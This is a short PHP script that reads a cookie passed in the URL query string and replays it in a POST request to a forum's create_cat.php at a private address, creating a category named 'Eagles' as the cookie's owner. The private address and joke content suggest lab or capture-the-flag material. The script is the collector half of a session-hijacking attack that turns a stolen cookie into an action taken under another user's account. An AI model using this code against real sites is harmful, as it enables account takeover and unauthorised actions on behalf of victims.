<?php
$request = new HttpRequest("http://10.1.1.3/forum/create_cat.php", HttpRequest::METH_POST);
$c = explode("=", $_GET["cookie"]);
$cookies[$c[0]] = $c[1];
$post_fields = array(
		"cat_name" => "Eagles",
		"cat_description" => "Where to find those delicious 
sloths!"
);
$request->addPostFields($post_fields);
$request->setCookies($cookies);
$request->send();
?>
